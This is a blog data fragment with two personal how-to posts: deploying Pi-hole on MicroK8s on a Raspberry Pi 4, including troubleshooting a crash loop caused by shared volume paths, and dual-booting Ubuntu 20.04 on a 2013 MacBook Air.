up!","authors":["kbbgl"],"tags":["docker","how-to","k8s","kubernetes","linux","pihole","raspberry_pi","troubleshooting"]},"unlisted":false,"prevItem":{"title":"How To Trace/Read RabbitMQ\xa0Messages","permalink":"/blog/how-to-trace-read-rabbitmq-messages"},"nextItem":{"title":"Installing Ubuntu 20.04 on 2013 MacBook\xa0Air","permalink":"/blog/installing-ubuntu-2004-on-2013-macbook-air"}},"content":"## PiHole, What\u2019s That?\\n\\nThe [Wikipedia definition](https://en.wikipedia.org/wiki/Pi-hole) should be sufficient in explaining what the software does:\\n\\n> Pi-hole or Pihole is a Linux network-level advertisement and Internet tracker blocking application which acts as a DNS sinkhole and optionally a DHCP server, intended for use on a private network\\n\\nI wanted to deploy it for a few reasons:\\n\\n- I have a spare Raspberry Pi 4 lying around.\\n- Because I\u2019m working on getting my CKAD (Certified Kubernetes Application Developer) certification and thought it would be a great hands-on practice.\\n- I couldn\u2019t find a good enough article that described how to install PiHole on Kubernetes. The majority did not go throught the whole procedure, were aimed for Docker/Swarm and Raspbian (Raspberry Pi flavored Linux distribution).\\n- I got tired of all the advertisements and popups on all the devices while surfing the web at home.\\n\\nThis post is here to explain how was able to deploy PiHole on Kubernetes and how I resolved some of the problems that occurred during the deployment process.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Setting Up Kubernetes on Ubuntu\\n\\nThere are a few ways to do this. I was looking at the different options but decided to choose MicroK8s in the end (over Charmed Kubernetes or kubeadm) simply because the Canonical team maintains it (Canonical is the publisher of Ubuntu) so I thought it would be the wisest decision long term as any kernel/software upgrades on the OS level would likely be QA\u2019d in the future in accordance with MicroK8s maintenance.\\nSince MicroK8s is bundled as a snap (an additional package manager for Ubuntu), it already includes all the binaries necessary to set up Kubernetes. So we can run the following command to install it:\\n\\n```bash\\nsudo snap install microk8s --classic\\n```\\n\\nWe also need to ensure that we\u2019re allowing the different Kubernetes components to communicate with each other. To modify the firewall settings, we run the following:\\n\\n```bash\\nsudo ufw allow in on cni0 && sudo ufw allow out on cni0\\nsudo ufw default allow routed\\n```\\n\\nWe also need to enable a DNS for the Kubernetes deployment. To do this we run:\\n\\n```bash\\nmicrok8s enable dns\\n```\\n\\nWe can then verify that the basic Kubernetes resources are up and running by:\\n\\n```bash\\nmicrok8s kubectl get all --all-namespaces\\n```\\n\\nWe should see that the kube-system namespace has the CNI (by  default Calico) controllers and node, coredns are running.\\nYou may have noticed that we need to prefix the `kubectl` commands with microk8s, which bothered me a bit because I was used to interacting with the Kubernetes API server using only `kubectl [ACTION] [RESOURCE]`. I decided to install `kubectl` from the `snap` store to prevent typing out an extra prefix:\\n\\n```bash\\nsnap install kubectl --classic\\n```\\n\\nWe now have a running bare Kubernetes single node and ready to create all the necessary resources!\\n\\n## Creating Storage and Kubernetes Resources\\n\\nOne of the great advantages of Kubernetes is the ability to isolate applications into their own scope, called Namespaces. Since I did see myself using the cluster for other projects in the future, I thought it would be practical to separate the Pihole project from the future projects into its own Namespace. To create the new namespace, I ran the following:\\n\\n```bash\\nkubectl create namespace pihole\\n```\\n\\nSince all of the following commands will be run in this namespace (and we want to save typing `-n pihole` in every command), we can just set the context of the following commands to the newly-created namespace. To do this:\\n\\n```bash\\nkubectl config set-content --current --namespace pihole\\n```\\n\\nNext I tackled the subject of storage. Since Pihole requires some persistent storage for configuration files, logs and data for its SQLLite database, we need to create a place in the filesystem that will be used as the mount for the persistent storage resources we\u2019ll set up for the Pod. So I created a directory in my home directory to hold it:\\n\\n```bash\\nmkdir ~/pihole/data\\n```\\n\\nMake sure that you have enough space in the directory you choose (you can use `df u /path/to/pihole/data` to verify).\\nNext, we need to create some resources to bind the host (Raspberry Pi) filesystem to the Kubernetes resources which will run the Pihole container. We need to create 3 things:\\n\\n1. Default `StorageClass` \u2013 This is just a resource that we use to describe the different types of storage the Kubernetes deployment offers. In our case, the `StorageClass` will be a simple one that\u2019s provisioned by the local machine.\\n1. 2 `PersistentVolume`s \u2013 These are abstractions of the volumes we\u2019ll be using to store the data for Pihole. We need to specify 2 of these, one for the assets stored in the /etc filesystem of the container (such as DNS server lists, domain lists , pihole FTL configuration, etc) and one for the `dnsmasq` filesystem (includes the initial Pihole configuration).\\n1. 2 `PersistentVolumeClaim`s \u2013 These are the actual requests for storage from the PVs created above.\\n\\nTo create the `StorageClass`, I defined the following specification called `storageclass.yaml`:\\n\\n```yaml\\napiVersion: storage.k8s.io/v1\\nkind: StorageClass\\nmetadata:\\n  name: manual\\nprovisioner: manual\\nreclaimPolicy: Delete\\nvolumeBindingMode: Immediate\\n```\\n\\nThe `volumeBindingMode: Immediate` ensures that upon specifying the `PersistentStorage` to the same provisioner type (manual), the `StorageClass` will immediately bind to it. The `reclaimPolicy` ensures that ones the `PersistentVolumeClaims` are discarded, so will the `StorageClass`.\\nWe can create the resource by running:\\n\\n```bash\\nkubectl apply -f storageclass.yaml\\n```\\n\\nNow that we have a `StorageClass` set up, we can create the 2 PVs (`volume-etc.yaml` and `volume-dnsmasq.yaml`, respectively):\\n\\n```yaml\\napiVersion: v1\\nkind: PersistentVolume\\nmetadata:\\n  name: pihole-volume\\n  labels:\\n    type: local\\nspec:\\n  storageClassName: manual\\n  capacity:\\n    storage: 1Gi\\n  accessModes:\\n    - ReadWriteOnce\\n  hostPath:\\n    path: \\"/home/ubuntu/pihole/data/\\"\\n```\\n\\n```yaml\\napiVersion: v1\\nkind: PersistentVolume\\nmetadata:\\n  name: pihole-dnsmasq\\n  labels:\\n    type: local\\nspec:\\n  storageClassName: manual\\n  capacity:\\n    storage: 1Gi\\n  accessModes:\\n    - ReadWriteOnce\\n  hostPath:\\n    path: \\"/home/ubuntu/pihole/data/\\"\\n```\\n\\nWe\u2019re defining 2 volumes with `1GB` of storage to bind with `StorageClass` named manual in the host filesystem path `~/pihole/data` (same path we created in the first step above). Keep in mind this path as we\u2019ll come back to this later.\\nWe can create both PVs by running:\\n\\nThe final step to set up the storage is to create the two `PersistentVolumeClaims`. Here are the two specifications for them (`claim-etc.yaml` and `claim-dnsmasq.yam`l, respectively):\\n\\nAnd create the PVCs:\\n\\n```bash\\nkubectl apply -f volume-etc.yaml\\nkubectl apply -f volume-dnsmasq.yaml\\n```\\n\\nGreat, let\u2019s verify that the storage is running set up correctly. It should look something like this:\\n\\n```bash\\nkubectl get sc,pv,pvc\\nNAME                                 PROVISIONER   RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\\nstorageclass.storage.k8s.io/manual   manual        Delete          Immediate           false                  3m\\nNAME                              CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                            STORAGECLASS   REASON   AGE\\npersistentvolume/pihole-dnsmasq   1Gi        RWO            Retain           Bound    pihole/pihole-dnsmasq-pv-claim   manual                  2m\\npersistentvolume/pihole-volume    1Gi        RWO            Retain           Bound    pihole/pihole-etc-pv-claim       manual                  2m\\nNAME                                            STATUS   VOLUME           CAPACITY   ACCESS MODES   STORAGECLASS   AGE\\npersistentvolumeclaim/pihole-dnsmasq-pv-claim   Bound    pihole-dnsmasq   1Gi        RWO            manual         1m\\npersistentvolumeclaim/pihole-etc-pv-claim       Bound    pihole-volume    1Gi        RWO            manual         1m\\n```\\n\\nWe can see that the `PersistentVolumeClaims`s are bound to their respective `PersistentVolume` and the `PersistentVolume`s are bound to the `StorageClass`. Looks good!\\nNow that we have the storage set up, we need to create two more specifications:\\n\\n1. A `Service` to specify the access to Pihole.\\n1. A `Deployment` which will pull the latest Pihole image from Dockerhub, create a container from this image, allow the Pod to use the storage we set up to hold its data and configuration files and bind to a Service so that we can access Pihole dashboard.\\n\\nLet\u2019s start with the service `svc.yaml`. We\u2019ll expose the Pihole server externally so we can access it from within our network. To do that, we need to know our internal IP address. We can find it easily by running:\\n\\n```bash\\nhostname -i | cut -d \\" \\" -f1\\n10.100.102.95\\n```\\n\\nWe can then use that value to finish off our `Service` specifications:\\n\\n```yaml\\napiVersion: v1\\nkind: Service\\nmetadata:\\n  name: pihole\\nspec:\\n  selector:\\n    app: pihole\\n  clusterIP: 10.152.183.2\\n  ports:\\n    - port: 80\\n      targetPort: 80\\n      name: pihole-admin\\n    - port: 53\\n      targetPort: 53\\n      protocol: TCP\\n      name: dns-tcp\\n    - port: 53\\n      targetPort: 53\\n      protocol: UDP\\n      name: dns-udp\\n  externalIPs:\\n  - 10.100.102.95\\n```\\n\\nWe then need to create the `Deployment` which binds the storage and network settings together. This is what it looks like (`deployment.yaml`):\\n\\n```yaml\\napiVersion: apps/v1\\nkind: Deployment\\nmetadata:\\n  name: pihole\\n  labels:\\n    app: pihole\\nspec:\\n  replicas: 1\\n  selector:\\n    matchLabels:\\n      app: pihole\\n  template:\\n    metadata:\\n      labels:\\n        app: pihole\\n        name: pihole\\n    spec:\\n      containers:\\n        - name: pihole\\n          image: pihole/pihole:latest\\n          env:\\n            - name: TZ\\n              value: \'Asia/Jerusalem\'\\n            - name: WEBPASSWORD\\n              value: \'YOUR_PASSWORD\'\\n            - name: TEMPERATUREUNIT\\n              value: c\\n          volumeMounts:\\n            - name: pihole-local-etc-volume\\n              mountPath: \'/etc/pihole\'\\n            - name: pihole-local-dnsmasq-volume\\n              mountPath: \'/etc/dnsmasq.d\'\\n      volumes:\\n        - name: pihole-local-etc-volume\\n          persistentVolumeClaim:\\n            claimName: pihole-etc-pv-claim\\n        - name: pihole-local-dnsmasq-volume\\n          persistentVolumeClaim:\\n            claimName: pihole-dnsmasq-pv-claim\\n```\\n\\nMost of this is boilerplate and optional. The important sectors are the volumes where we specify the PVC bindings and the matchLabels which binds the `Service` to the `Deployment`. Also, you can set a password for the Pihole dashboard admin page by changing the value of `spec.template.spec.containers[0].WEBPASSWORD`.\\nI ran the following command to create the deployment:\\n\\n```bash\\nkubectl apply -f deployment.yaml\\n```\\n\\nUnfortunately, I noticed that the pihole `Pod` was in a `CrashLoopBackoff`!\\n\\n## Troubleshooting PiHole Pod CrashLoopBackOff\\n\\nThe first step in troubleshooting a `CrashLoopBackoff` is to review the `Pod` logs. This is what I saw:\\n\\n```bash\\nkubectl logs pihole-64678974cd-p7spj \\n# ...\\n::: Preexisting ad list /etc/pihole/adlists.list detected ((exiting setup_blocklists early))\\nhttps://raw.githubusercontent.com/StevenBlack/hosts/master/hosts\\ndnsmasq: bad option at line 1 of /etc/dnsmasq.d/adlists.list\\n::: Testing pihole-FTL DNS: [cont-init.d] 20-start.sh: exited 1.\\n[cont-finish.d] executing container finish scripts...\\n[cont-finish.d] done.\\n[s6-finish] waiting for services.\\n[s6-finish] sending all processes the TERM signal.\\n```\\n\\nSo it seemed that there was some sort of unexpected issue when reading a file named adlists.list. But since the `Pod` was in a `CrashLoopBackoff`, I could not have direct access to the Pod to check the file because it was constantly restarting.\\nTherefore, I went the hard route and decided to download the pihole image to review the source code and pinpoint the failure.\\n\\n## Installing Docker to Troubleshoot Image Initialization Failure\\n\\nTo install Docker on the Raspberry Pi, I needed to figure out first what architecture the processor is running.\\nI ran the following command and found that the I was running `aarch64`:\\n\\n```bash\\nuname -m\\naarch64\\n```\\n\\nBut when reviewing the Docker documentation how to install the engine on Ubuntu, I saw that the only tabs available were `x86_64`/`amd64`, `armhf` or `arm64`.\\nSo I did some research and found that the GNU triplet for the 64-bit ISA is `aarch64`. So essentially `aarch64` is `arm64`.\\nI ran the following commands to install Docker:\\n\\n```bash\\nsudo apt install apt-transport-https ca-certificates curl gnupg lsb-release\\necho \\\\\\\\n  \\"deb [arch=arm64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\\\\\\\n  $(lsb_release -cs) stable\\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\\nsudo apt update\\nsudo apt install docker-ce docker-ce-cli containerd.io\\n```\\n\\nI then created the pihole container:\\n\\n```bash\\nsudo docker run -it pihole/pihole bash\\n```\\n\\nOn another ssh session, I ran the following command on the host machine to download the content of the pihole image into an archive `pihole.tar`:\\n\\n```bash\\n# -l returns the latest container\\n# -q quiet output\\ncontainer_id=`sudo docker ps -lq`\\necho $container_id\\n4565bc8fe1e1\\nsudo docker export $container_id -o pihole.tar\\n```\\n\\nNow that I had the contents of the image, I can terminate the container by simply exiting the session created by docker run -it.\\nI could then decompress the tar:\\n\\n```bash\\nmkdir /tmp/pihole\\ntar xvf pihole.tar -C /tmp/pihole\\n```\\n\\nand review the source code to check why startup was failing.\\nSince I knew that the failure occurs on the following line:\\n\\n```text\\n::: Testing pihole-FTL DNS: [cont-init.d] 20-start.sh: exited 1.\\n```\\n\\nI could use the search for that particular line in the whole image filesystem I just extracted and see which file has the logic.\\n\\n```bash\\nsudo grep -rnw \\"Testing pihole\\" ./* --exclude pihole.tar\\n./bash_functions.sh:260:    echo -n \'::: Testing pihole-FTL DNS: \'\\n```\\n\\nSo we can see that this line is called in the shell script `bash_functions.sh` in line 260. This is what the scope looks like:\\n\\n```bash\\ntest_configs() {\\n     set -e\\n     echo -n \'::: Testing pihole-FTL DNS: \'\\n     sudo -u ${DNSMASQ_USER:-root} pihole-FTL test || exit 1\\n     echo -n \'::: Testing lighttpd config: \'\\n     lighttpd -t -f /etc/lighttpd/lighttpd.conf || exit 1\\n     set +e\\n     echo \\"::: All config checks passed, cleared for startup ...\\"\\n}\\n```\\n\\nSo seems that we\u2019re running the command `pihole-FTL test`  as `root` and send an exit code of 1 if the command fails (which it does in this case). The next step is to figure out what\u2019s the command: `pihole-FTL test`.\\nWe can find the binary by searching for it in the whole extracted image filesystem:\\n\\n```bash\\nfind /tmp/pihole -name \\"*pihole-FTL*\\"\\n/usr/bin/pihole-FTL\\n```\\n\\nI decided to recreate the container so I could interact with this binary:\\n\\n```bash\\n# Inside pihole container\\nroot@371cad2a9105:/# pihole-FTL --help\\npihole-FTL - The Pi-hole FTL engine\\nUsage:    sudo service pihole-FTL <action>\\nwhere \'<action>\' is one of start / stop / restart\\nAvailable arguments:\\n            debug           More verbose logging,\\n                            don\'t go into daemon mode\\n            test            Don\'t start pihole-FTL but\\n                            instead quit immediately\\n        -v, version         Return FTL version\\n        -vv                 Return more version information\\n        -t, tag             Return git tag\\n        -b, branch          Return git branch\\n        -f, no-daemon       Don\'t go into daemon mode\\n        -h, help            Display this help and exit\\n        dnsmasq-test        Test syntax of dnsmasq\'s\\n                            config files and exit\\n        regex-test str      Test str against all regular\\n                            expressions in the database\\n        regex-test str rgx  Test str against regular expression\\n                            given by rgx\\n        --lua, lua          FTL\'s lua interpreter\\n        --luac, luac        FTL\'s lua compiler\\n        dhcp-discover       Discover DHCP servers in the local\\n                            network\\n        sqlite3             FTL\'s SQLite3 shell\\nOnline help: https://github.com/pi-hole/FTL\\n```\\n\\nThe strange is that running the same command, in a Docker container where PiHole loads successfully, also returns an exit code of 1:\\n\\n```bash\\n# Inside pihole container\\nroot@371cad2a9105: sudo -u pihole-FTL test;echo $?\\n1\\n```\\n\\nThis threw me off a bit. My main question was: How come the Docker container\u2019s initialization script finishes successfully but the same container running in a Kubernetes Pod fails?\\nI had to take a step back and try to understand what\u2019s the biggest difference between the Docker method that works and the Kubernetes method that fails. The only possible differences that I could think of were (1) no port forwarding, host network on Docker (2) no presistent storage set up in Docker.\\nSince I always seem to have a problem with using the `StorageClass`, `PersistentVolume` and `PersistentVolumeClaim` APIs in Kubernetes, my gut told me that I had mis-configured something there.\\nWhen navigating back to the mount path that I set in the PV YAML specification, I noticed that in both PVs (etc, `dnsmasq`) I set the path to be the same, namely `/home/ubuntu/pihole/data`. I decided I would create two different mount points, and retest it.\\nBelow are the modifications I made (see comment):\\n\\n```yaml\\n# volume-etc.yaml\\napiVersion: v1\\nkind: PersistentVolume\\nmetadata:\\n  name: pihole-volume\\n  labels:\\n    type: local\\nspec:\\n  storageClassName: manual\\n  capacity:\\n    storage: 1Gi\\n  accessModes:\\n    - ReadWriteOnce\\n  hostPath:\\n    path: \\"/home/ubuntu/pihole/data/etc\\" # Changed from /home/ubuntu/data/\\n```\\n\\n```yaml\\n# volume-dnsmasq.yaml\\napiVersion: v1\\nkind: PersistentVolume\\nmetadata:\\n  name: pihole-dnsmasq\\n  labels:\\n    type: local\\nspec:\\n  storageClassName: manual\\n  capacity:\\n    storage: 1Gi\\n  accessModes:\\n    - ReadWriteOnce\\n  hostPath:\\n    path: \\"/home/ubuntu/pihole/data/dnsmasq\\"\\n```\\n\\nI recreated all Kubernetes resources after the updates and found that the Pod ran successfully!\\n\\n```bash\\nwatch -t kubectl get pv,pvc,sc,deploy,svc,pod\\nNAME                              CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                            STORAGECLASS   REASON   AGE\\npersistentvolume/pihole-dnsmasq   2Gi        RWO            Retain           Bound    pihole/pihole-dnsmasq-pv-claim   manual                  13m  \\npersistentvolume/pihole-volume    2Gi        RWO            Retain           Bound    pihole/pihole-etc-pv-claim       manual                  13m  \\nNAME                                            STATUS   VOLUME           CAPACITY   ACCESS MODES   STORAGECLASS   AGE\\npersistentvolumeclaim/pihole-dnsmasq-pv-claim   Bound    pihole-dnsmasq   2Gi        RWO            manual         13m  \\npersistentvolumeclaim/pihole-etc-pv-claim       Bound    pihole-volume    2Gi        RWO            manual         12m  \\nNAME                                 PROVISIONER   RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\\nstorageclass.storage.k8s.io/manual   manual        Delete          Immediate           false                  7h4m \\nNAME                     READY   UP-TO-DATE   AVAILABLE   AGE\\ndeployment.apps/pihole   1/1     1            1           12m  \\nNAME             TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                AGE\\nservice/pihole   ClusterIP   10.152.183.2   10.100.102.95        80/TCP,53/TCP,53/UDP   12m  \\nNAME                          READY   STATUS    RESTARTS   AGE\\npod/pihole-64678974cd-mxwcw   1/1     Running   0          12m\\n```\\n\\nNice! Now we have PiHole running locally on the server!\\nThe last step was to ensure that we direct all DNS queries from our home network to the Pihole DNS server instead of our router.\\n\\n## Changing DNS Settings on Devices\\n\\nThe first device I changed was a 2013 MacBook Air running the latest Ubuntu Desktop that I used to SSH into the Raspberry Pi to set up Pihole.\\nIt was quite easy to change the DNS server. Just go to _WiFi > Choose currently connected WiFi network kegwheel > IPv4 tab > Disable Automatic DNS and set the IP of your Raspberry Pi IP address_ (Search up for `hostname -i` in this page to see the command again). After I restarted my laptop, I began seeing lots of queries getting blocked:\\n\\n![rpi](https://tilsupport.files.wordpress.com/2021/05/image-1.png?w=1024)\\n\\n## Setting Up Static IP for the Cluster\\n\\nUnfortunately for me, I\u2019m using my ISP\u2019s router and not one I have full control of. This means that I do not have access to some of the router settings such as configuring the DNS server for the whole network and I can\u2019t also control the DHCP settings. This is an important limitation because I cannot control how the router assigns IPs and I was anticipating a scheduled job I have configured in crontab to reboot the server at some point causing the router to assign a new IP within the specified range. I needed to somehow ensure that the Raspberry Pi requests a specific (static) IP address to be assigned to it after reboot.\\nTo set up a static IP address, we need to use a tool called [`netplan`](https://netplan.io/), the default Ubuntu network configuration utility.\\nBut first, we must confirm which interface we\u2019re going to configure to request the static IP for. In my case, I was connected to the router using the WiFi interface `wlan0`. You can find yours by running `ip link` although it\u2019s usually `en0` for Ethernet (wired) connection and `wlan0` for WiFi.\\nNext, we can start interacting with the `netplan` configuration.\\nFirst, let\u2019s create a backup file (always good practice):\\n\\n```bash\\nsudo cp /etc/netplan/50-cloud-init.yaml /etc/netplan/50-cloud-init.yaml.bak\\n```\\n\\nNext, let\u2019s open the `50-cloud-init.yaml` configuration file to add the necessary configuration. In my case, since the interface is wlan0, I will be modifying the `network.wifis.wlan0` object but it should be the same for `network.ethernets.eth0` in case you use Ethernet.\\nLet\u2019s open the file for editing:\\n\\n```bash\\nsudo vim /etc/netplan/50-cloud-init.yaml\\n```\\n\\nAnd see the comments for the added fields:\\n\\n```yaml\\nnetwork:\\n  ethernets:\\n    eth0:\\n      dhcp4: true\\n      optional: true\\n  version: 2\\n  wifis:\\n    wlan0:\\n      optional: true\\n      addresses: # add section\\n        - 10.100.102.95/24 # add node IP\\n      gateway4: 10.100.102.1 # add router IP\\n      nameservers: # add section\\n        addresses: [10.100.102.95, 8.8.8.8] # add node IP and Google as alternate DNS\\n      access-points:\\n        \\"YOUR_AP_NAME\\":\\n          password: \\"YOUR_AP_PW\\"\\n      dhcp4: false # true -> false\\n```\\n\\nTo know what\u2019s your router/gateway IP for `gateway4`, you can run the following command:\\n\\n```bash\\nip route | grep default | cut -d \\" \\" -f3 | head -n1\\n10.100.102.1\\n```\\n\\nWe can then apply the changes running:\\n\\n```bash\\nsudo netplan apply\\n```\\n\\nAnd we can confirm it\u2019s set up by running:\\n\\n```bash\\nip addr show dev wlan0\\n3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\\n    link/ether dc:a6:32:be:b8:c4 brd ff:ff:ff:ff:ff:ff\\n    inet 10.100.102.95/24 brd 10.100.102.255 scope global dynamic wlan0\\n       valid_lft 3550sec preferred_lft 3550sec\\n```\\n\\nWe can then restart the Raspberry Pi for the changes to take effect. Now we\u2019ll be able to run maintenance on the device that requires restarts without breaking the whole cluster because of an incorrect address assignment by the router.\\n\\n## Maintenance, `kubectl drain/uncordon`\\n\\nAfter about a week of running, I performed an `apt upgrade` which required me to reboot the server for the changes to apply. I needed to take the Pihole (and the whole Raspberry Pi) down.\\nTo do this, we first need to ensure that we evict all running Kubernetes resources and that we stop scheduling of new Pods to the cluster.\\nWe need to run the following sequence of commands to be able to ensure that our server restart runs smoothely.\\n\\n```bash\\n# Get node name\\nnode_name=`kubectl get node -o=jsonpath=\'{.items[0].metadata.labels}\' | jq \'.\\"kubernetes.io/hostname\\"\'`\\n \\n# Drain node, will evict all resources\\nkubectl drain $node_name --ignore-daemonsets --delete-local-data --force\\n  \\n# Reboot the server\\nsudo reboot\\n```\\n\\nAfter reboot, wait until `kubelet.service` is up and run:\\n\\n```bash\\nnode_name=`kubectl get node -o=jsonpath=\'{.items[0].metadata.labels}\' | jq \'.\\"kubernetes.io/hostname\\"\'`\\n \\nkubectl uncordon $node_name\\n```\\n\\nWe should then see that the Node is schedulable and that the all Pihole resources are back up and running."},{"id":"installing-ubuntu-2004-on-2013-macbook-air","metadata":{"permalink":"/blog/installing-ubuntu-2004-on-2013-macbook-air","source":"@site/blog/installing-ubuntu-2004-on-2013-macbook-air.md","title":"Installing Ubuntu 20.04 on 2013 MacBook\xa0Air","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Mac","permalink":"/blog/tags/mac"},{"inline":false,"label":"Ubuntu","permalink":"/blog/tags/ubuntu"}],"readingTime":7.905,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"installing-ubuntu-2004-on-2013-macbook-air","title":"Installing Ubuntu 20.04 on 2013 MacBook\xa0Air","description":"Fill me up!","authors":["kbbgl"],"tags":["mac","ubuntu"]},"unlisted":false,"prevItem":{"title":"Installing PiHole On Raspberry Pi 4, MicroK8s running Ubuntu 20.04\xa0(focal)","permalink":"/blog/install-pihole-rpi4-microk8s-ubuntu-2004"},"nextItem":{"title":"MacBook Pro 2020 High CPU caused by\xa0Siri","permalink":"/blog/macbook-pro-2020-high-cpu-caused-siri"}},"content":"## Introduction\\n\\nThe other day when visiting my family, under a large pile of torn up binders and laminated documents, I found my sibling\u2019s old 2013 MacBook Air. I thought it would be wasteful to just leave it there so I picked it up and took it to the lab, AKA home.\\nI discovered that the laptop was password locked with my sibling\u2019s user and password. Since it must\u2019ve been laying at my family\u2019s house for a few years at least, and we as human\u2019s have a tendency to forget our credentials, I decided to save the attempts and just format it and start with a clean OS.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Formatting and Reinstalling MacOS\\n\\n1. In the\xa0[menu bar](https://support.apple.com/en-il/guide/mac-help/aside/mchl385f1eea/10.13/mac/10.13), choose Apple menu > Restart. As your Mac restarts, hold down the `Command + R` keys until the macOS Utilities window appears.\\n1. Select _Disk Utility_, then click Continue.\\n1. Select your startup disk on the left, then click _Erase_.\\n1. Click the Format pop-up menu, choose [Mac OS Extended format](https://support.apple.com/en-il/guide/mac-help/aside/dsku61bc26a5/10.13/mac/10.13), enter a name, then click _Erase_.\\n1. After the disk is erased, choose _Disk Utility > Quit Disk Utility_.\\n1. Select\xa0[Reinstall macOS](https://support.apple.com/en-il/guide/mac-help/reinstall-macos-mchlp1599/10.13/mac/10.13), click _Continue_, then follow the onscreen instructions.\\n\\nAll of the steps ran smoothly and I had a working machine! The battery was still in really good shape as well, the screen was scratchless and the keyboard still had that bounce to it.\\nSo I began downloading all the applications I usually use like Google Chrome, iTerm, Visual Studio Code. But when launching Google Chrome, I discovered that when navigating to GMail or Google Drive, I received an error message indicating that the applications do not support this browser and operating system.\\nI wasn\u2019t buying it that the hardware would not be able to run the browser and applications and I had a strong belief that it\u2019s some Apple-imposed limitation as part of the \u2018[Lightbulb Conspiracy](https://en.wikipedia.org/wiki/Planned_obsolescence).\u2019 So I decided to pursue a different option: installing the latest Ubuntu on this 2013 MacBook Air to free the software restrictions of the machine manufacturer and unleash the power of the hardware.\\nI decided the best approach would be to initially dual boot MacOS and Ubuntu, ensure that Ubuntu is stable and then remove the partition where MacOS lives.\\n\\n## Create a Bootable Ubuntu USB Stick\\n\\nThe first step was to generate a bootable USB stick which would hold the Ubuntu image.\\nI logged into MacOS and downloaded the latest Ubuntu image from [Ubuntu Desktop](https://ubuntu.com/download/desktop) and saved it in `~/Downloads/ubuntu-20.04.2.0-desktop-amd.iso`.\\n\\nI then opened the Terminal and ran the following command:\\n\\n```bash\\nhdiutil convert -format UDRW -o /tmp/ubuntu.img ~/Downloads/ubuntu-20.04.2.0-desktop-amd.iso\\n```\\n\\nThe command utilizes the MacOS `hdutil` tool to convert an image between two data types: `.iso` (disk image in ISO-9660 standard) to `.img.dmg` (disk image specifically by MacOS). The `-format UDRW` argument specifies that we want to read and write the image with the Apple `UDIF` format. To read more about the hdutil and UDIF format, I suggest reading the [hdutil man page](https://ss64.com/osx/hdiutil.html) and [disk image formats](http://disktype.sourceforge.net/doc/ch03s13.html).\\n\\nThe command above created a new file in `/tmp/ubuntu.img.dmg`. But since we don\u2019t want to run the MacOS installer (which is what the dmg image and extension do by default) in this case but want to create a bootable USB stick, we\u2019ll need to convert the image from `.img.dmg` to `.img`:\\n\\n```bash\\nmv /tmp/ubuntu.img.dmg /tmp/ubuntu.img\\n```\\n\\nAt this point we can insert the USB stick which will likely be mounted by default to `/dev/disk1`.\\nNext, we need to unmounting the disk representing the USB stick, copying all files from the image to the unmounted disk using the dd binary and then ejecting the disk. We can perform all these steps using the MacOS `diskutil` binary within the Terminal:\\n\\n```bash\\ndiskutil unmountDisk /dev/disk1\\n\xa0\\nsudo dd if=/tmp/ubuntu.img of=/dev/rdisk1 bs=1m\\n\xa0\\ndiskutil eject /dev/disk1\\n```\\n\\nWe\u2019re done with this step! We now have a USB stick containing the Ubuntu OS. We can eject it for now.\\nNext, we need to prepare some disk space on the hard disk where we intend to install Ubuntu.\\n\\n## Creating a Partition\\n\\nA partition is basically a separation of the hard disk into individual sections (also known as containers).\\n\\n![cont](https://www.maketecheasier.com/assets/uploads/2012/05/partitions-partition-diagram.png)\\n\\nTo be able to run both Ubuntu and MacOS on the same machine, we require to create a partition in the hard disk to hold both operating systems.\\nThis step is rather straightforward with the use of the MacOS Disk Utility. We need to launch it, select the first disk we see on the left navver (called _Macintosh HD_ in the image below):\\n\\nThen click on _Partition_, choose the size of the disk you want to allocate to the partition where we\u2019ll store Ubuntu, make sure the selected format is _Mac OS Extended (Case-sensitive, Journaled)_ and click Apply. My hard disk size was 120GB so I allocated 80GB to Ubuntu and left the rest for MacOS.\\n\\n## Replacing MacOS Default Boot Manager\\n\\nLet\u2019s recap what we have done so far:\\n\\nWhat would be the next logical step? We would need to tell the machine to let us decide which operating system we want to boot into. By default, the Apple bootloader will load MacOS. To change this behavior, we need to install a different boot manager. We need [rEFInd Boot Manager](https://www.rodsbooks.com/refind/) to do this.\\n\\n[Download the binary](http://sourceforge.net/projects/refind/files/0.13.2/refind-bin-0.13.2.zip/download) from here and extract it:\\n\\n```bash\\nunzip ~/Downloads/refind-bin-0.13.2.zip\\n```\\n\\nThen reboot the machine and hold `Command + R`. This should bring you into Recovery Mode.\\n\\nWe need to run the `rEFInd` installation script. From the main menu bar, choose Utilities > Terminal and type the following command:\\n\\n```bash\\ncd /Volumes/Macintosh\\\\ HD/Users/YOUR_USERNAME/Downloads/refined\\n\xa0\\n./refind-install\\n```\\n\\nThis will install the rEFInd boot manager. After it completes, shut down the machine, insert the USB stick we\u2019ve prepared earlier and turn on the machine.\\n\\n## Launching and Installing Ubuntu\\n\\nWhen we turn on the machine the next time, we will be greeted with the rEFInd Boot Manager:\\n\\n![refind](https://www.rodsbooks.com/refind/refind.png)\\n\\nSelect Tux (the penguin, Linux mascot) and use the arrows to navigate to the _Try Ubuntu without install_ option. Then press _e_ which will expose a configuration file where we will make some changes. We will need to add the following commands between \u2018splash\u2018 and \u2018---\u2018:\\n\\n```bash\\nnomodeset radeon.audio=1\\n```\\n\\nThis is because by default, the Radeon HDMI audio driver is disabled in the Linux kernel. After making this change, press F10 to save and exit.\\nAfter a minute or two, you should be the Ubuntu menu:\\n\\n![ubuntu](https://ubuntucommunity.s3-us-east-2.amazonaws.com/original/2X/a/ad5e454a9fd45fd56d90da951702c2f2224cd32a.png)\\n\\nClick on _Install Ubuntu_, follow the installation wizard you should be set!\\n\\n## 